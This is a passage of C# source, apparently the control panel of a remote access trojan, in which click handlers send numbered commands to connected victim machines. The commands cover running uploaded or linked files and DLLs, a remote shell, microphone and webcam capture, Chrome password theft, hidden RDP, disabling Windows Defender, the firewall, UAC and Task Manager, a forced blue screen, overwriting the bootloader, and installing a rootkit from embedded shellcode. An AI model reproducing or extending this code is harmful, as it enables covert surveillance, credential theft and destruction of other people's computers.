            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            TTSForm tTSForm = new TTSForm();
            tTSForm.ConnectionID = CurrentSelectedID;
            tTSForm.Show();
        }
        private void Notepad_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            NotepadForm notepadForm = new NotepadForm();
            notepadForm.ConnectionID = CurrentSelectedID;
            notepadForm.Show();
        }
        private void WebsiteVisit_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            VisitSiteForm VisitSiteform = new VisitSiteForm();
            VisitSiteform.ConnectionID = CurrentSelectedID;
            VisitSiteform.Show();
        }

        private void FromDiskExecute_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Multiselect = false;
            OFD.Filter = "Files (.*)|*.*";
            if (OFD.ShowDialog() == DialogResult.OK)
            {
                if (OFD.FileName == null) return;
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)36);
                ToSend.AddRange(Encoding.UTF8.GetBytes(Path.GetExtension(OFD.FileName)));
                PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
                string FileString = OFD.FileName;
                byte[] FileBytes;
                using (FileStream FS = new FileStream(FileString, FileMode.Open))
                {
                    FileBytes = new byte[FS.Length];
                    FS.Read(FileBytes, 0, FileBytes.Length);

                    List<byte> ToSendS = new List<byte>(); 
                    ToSendS.Add((int)2);
                    ToSendS.AddRange(FileBytes);
                    PacketSender.Send(CurrentSelectedID, ToSendS.ToArray());
                }
            }
        }

        private void FromLinkExecute_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            ExecuteLinkForm executeLinkForm = new ExecuteLinkForm();
            executeLinkForm.ConnectionID = CurrentSelectedID;
            executeLinkForm.Show();
        }

        private void ChangeDesktopWall_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Multiselect = false;
            OFD.Filter = "Image Files|*.jpg;*.jpeg;*.png;";
            if (OFD.ShowDialog() == DialogResult.OK)
            {
                string FileString = OFD.FileName;
                byte[] FileBytes;
                using (FileStream FS = new FileStream(FileString, FileMode.Open))
                {
                    FileBytes = new byte[FS.Length];
                    FS.Read(FileBytes, 0, FileBytes.Length);
                }
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)8);
                ToSend.AddRange(FileBytes);
                PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
            }
        }
        private void TaskMGR_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)9);
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void winlock_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            winlock winlockf = new winlock();
            winlockf.ConnectionID = CurrentSelectedID;
            winlockf.Show();
        }

        private void RShell_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)13);
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void RemoteMicro_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)48);
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private static WaveOut woplayer = new WaveOut(0);
        private static WaveOut woplayer1 = new WaveOut(0);

        private void PassRecover_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)20);
            if (System.Windows.Forms.MessageBox.Show("Should Chrome be automatically terminated before recovery? This will result in more data being recovered.", "Password Recovery", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                ToSend.AddRange(Encoding.UTF8.GetBytes("true"));
            else
                ToSend.AddRange(Encoding.UTF8.GetBytes("false"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void Rotate0Deg_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)21);
            ToSend.AddRange(Encoding.UTF8.GetBytes("0"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void Rotate90Deg_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)21);
            ToSend.AddRange(Encoding.UTF8.GetBytes("90"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void Rotate180Deg_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)21);
            ToSend.AddRange(Encoding.UTF8.GetBytes("180"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void Rotate270Deg_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)21);
            ToSend.AddRange(Encoding.UTF8.GetBytes("270"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void KeyQWERTY_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)22);
            ToSend.AddRange(Encoding.UTF8.GetBytes("QWERTY"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void KeyQWERTZ_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)22);
            ToSend.AddRange(Encoding.UTF8.GetBytes("QWERTZ"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void KeyAZERTY_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)22);
            ToSend.AddRange(Encoding.UTF8.GetBytes("AZERTY"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void Mswap_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)23);
            ToSend.AddRange(Encoding.UTF8.GetBytes("1"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void Mrestore_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)23);
            ToSend.AddRange(Encoding.UTF8.GetBytes("0"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void CDOpen_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)24);
            ToSend.AddRange(Encoding.UTF8.GetBytes("1"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void CDClose_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)24);
            ToSend.AddRange(Encoding.UTF8.GetBytes("0"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void Negative_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)25);
            ToSend.AddRange(Encoding.UTF8.GetBytes("0"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void Blur_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)25);
            ToSend.AddRange(Encoding.UTF8.GetBytes("1"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        //Radial_Click
        private void Radial_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)25);
            ToSend.AddRange(Encoding.UTF8.GetBytes("4"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void Tun_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)25);
            ToSend.AddRange(Encoding.UTF8.GetBytes("2"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void Blood_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)25);
            ToSend.AddRange(Encoding.UTF8.GetBytes("5"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void Melt_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)25);
            ToSend.AddRange(Encoding.UTF8.GetBytes("3"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void TBSoD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)26);
            if (MessageBox.Show("Triggering Blue screen of death will result in a reboot of client '" + CurrentSelectedID + "'", "Trigger BSoD", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void SysInfo_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)27);
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void DisableTaskMGR_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)28);
            ToSend.AddRange(Encoding.UTF8.GetBytes("1"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void DisableRegistry_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)28);
            ToSend.AddRange(Encoding.UTF8.GetBytes("2"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void DisableUAC_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)28);
            ToSend.AddRange(Encoding.UTF8.GetBytes("3"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void DisableFirewall_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)28);
            ToSend.AddRange(Encoding.UTF8.GetBytes("4"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void DisableWinDef_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)28);
            ToSend.AddRange(Encoding.UTF8.GetBytes("5"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void DisableCMD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)28);
            ToSend.AddRange(Encoding.UTF8.GetBytes("6"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void DisableRun_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)28);
            ToSend.AddRange(Encoding.UTF8.GetBytes("7"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void DisableWinKeys_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)28);
            ToSend.AddRange(Encoding.UTF8.GetBytes("8"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void Off_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)29);
            if (MessageBox.Show("Are you sure want to power off the client '" + CurrentSelectedID + "'", "Shutdown", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void Restart_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)30);
            if (MessageBox.Show("Are you sure want to restart the client '" + CurrentSelectedID + "'", "reset", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void RegistryClean_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)34);
            if (MessageBox.Show("Are you sure want to remove system from client " + CurrentSelectedID + "?" + "\nDO YOU WANT TO EXECUTE THIS COMMAND, RESULTING IN AN UNUSABLE MACHINE? ", "Remove system", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void OMBR_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            if (userslist[ListViewU.SelectedIndex].Privileges.ToString().ToLower() == "user")
            {
                notificationManager.Show(new NotificationContent
                {
                    Title = "Bootloader overwriter",
                    Message = "No administrator rights",
                    Type = NotificationType.Error
                });
                return;
            }
            if (MessageBox.Show("Are you sure want to remove system from client " + CurrentSelectedID + "?" + "\nDO YOU WANT TO EXECUTE THIS COMMAND, RESULTING IN AN UNUSABLE MACHINE? ", "Remove system", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                BootloaderOW bootloaderOW = new BootloaderOW();
                bootloaderOW.ConnectionID = CurrentSelectedID;
                bootloaderOW.Show();
            }
        }

        private void Refresh_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            ListViewU.ItemsSource = "";
            ListViewU.ItemsSource = userslist;
        }

        private void VBS_Script_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            Scripting SCRIPT = new Scripting();
            SCRIPT.ConnectionID = CurrentSelectedID;
            SCRIPT.Show();
        }

        private void MinimizeALL_Click(object sender, RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)40);
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void FM_Click(object sender, RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            if (fileManager != null) fileManager.Close();
            fileManager = new FileManager(this);
            fileManager.ConnectionID = CurrentSelectedID;
            fileManager.Show();
        }

        private void GS_Click(object sender, RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            if (startupManager != null) startupManager.Close();
            startupManager = new StartupManager(this);
            startupManager.ConnectionID = CurrentSelectedID;
            startupManager.Show();
        }
        private void NW_Click(object sender, RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            if (netManager != null) netManager.Close();
            netManager = new NetManager(this);
            netManager.ConnectionID = CurrentSelectedID;
            netManager.Show();
        }

        private void RemoteCam_Click(object sender, RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)53);
            ToSend.AddRange(Encoding.UTF8.GetBytes("0"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void RChat_Click(object sender, RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)54);
            ToSend.AddRange(Encoding.UTF8.GetBytes("1"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
            if (remoteChat != null) remoteChat.Close();
            remoteChat = new RemoteChat();
            remoteChat.ConnectionID = CurrentSelectedID;
            remoteChat.Show();
        }

        private void Beep_Click(object sender, RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            Beeper beeper = new Beeper();
            beeper.ConnectionID = CurrentSelectedID;
            beeper.Show();
        }

        private void HS_Click(object sender, RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)57);
            ToSend.AddRange(Encoding.UTF8.GetBytes("0"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
        private void csharpscript_Click(object sender, RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Multiselect = false;
            OFD.Filter = "Dynamic link library (.dll)|*.dll";
            if (OFD.ShowDialog() == DialogResult.OK)
            {
                if (OFD.FileName == null) return;
                string FileString = OFD.FileName;
                byte[] FileBytes;
                using (FileStream FS = new FileStream(FileString, FileMode.Open))
                {
                    FileBytes = new byte[FS.Length];
                    FS.Read(FileBytes, 0, FileBytes.Length);

                    List<byte> ToSendS = new List<byte>();
                    ToSendS.Add((int)68);
                    ToSendS.AddRange(FileBytes);
                    PacketSender.Send(CurrentSelectedID, ToSendS.ToArray());
                }
            }
        }

        private void HRDP_Click(object sender, RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)59);
            ToSend.AddRange(Encoding.UTF8.GetBytes("0"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());

            hiddenRDP = new HiddenRDP();
            hiddenRDP.ConnectionID = CurrentSelectedID;
            hiddenRDP.Show();
            if (userslist[ListViewU.SelectedIndex].Privileges.ToString().ToLower() == "user") hiddenRDP.adminRights.Foreground = new SolidColorBrush(Colors.Red);
            else { hiddenRDP.adminRights.Foreground = new SolidColorBrush(Colors.Green); hiddenRDP.installb.IsEnabled = true; }

        }

        private void rKit_install(object sender, RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            if (userslist[ListViewU.SelectedIndex].Privileges.ToString().ToLower() == "user") 
            {
                notificationManager.Show(new NotificationContent
                {
                    Title = "Rootkit",
                    Message = "No administrator rights",
                    Type = NotificationType.Error
                });
                return; 
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)66);
            ToSend.AddRange(shellcode.rawData);
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }
    }
}
